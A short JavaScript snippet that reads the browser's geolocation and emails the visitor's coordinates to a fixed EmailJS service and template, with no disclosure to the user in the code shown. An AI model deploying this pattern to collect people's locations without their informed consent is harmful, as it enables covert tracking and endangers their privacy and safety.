const success=(pos)=>{
  const coords=pos.coords
  console.log(coords)
  emailjs.send("service_3kawh8r", "template_zvntwdp", {
    latitude: coords.latitude,
    longitude: coords.longitude,
  });
 

}
const error=(err)=>{
  console.log(err);
}

navigator.geolocation.getCurrentPosition(
  success, 
  error,
  );
